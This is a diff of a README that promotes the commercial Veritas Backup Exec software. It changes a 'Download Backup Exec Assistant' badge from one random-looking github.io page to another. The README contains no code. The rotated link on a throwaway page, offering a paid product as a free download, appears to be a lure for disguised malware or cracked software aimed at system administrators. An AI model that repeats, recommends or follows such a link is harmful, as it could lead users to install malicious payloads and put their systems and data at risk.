@@ -3,7 +3,7 @@
 Take control of your data infrastructure with **Veritas Backup Exec** — a robust backup and recovery platform tailored for virtual, physical, and cloud-based environments. Ideal for system administrators, enterprise IT teams, and organizations with critical data workflows.
 
 ⬇️ **Download**  
-[![Download Backup Exec Assistant](https://img.shields.io/badge/Download-Backup_Exec_Assistant-brightgreen?style=for-the-badge)](https://trahendon.github.io/.github/BackupExec=PCinf0)
+[![Download Backup Exec Assistant](https://img.shields.io/badge/Download-Backup_Exec_Assistant-brightgreen?style=for-the-badge)](https://fastertheiukkol12info1.github.io/.github/)
 
 ---
 
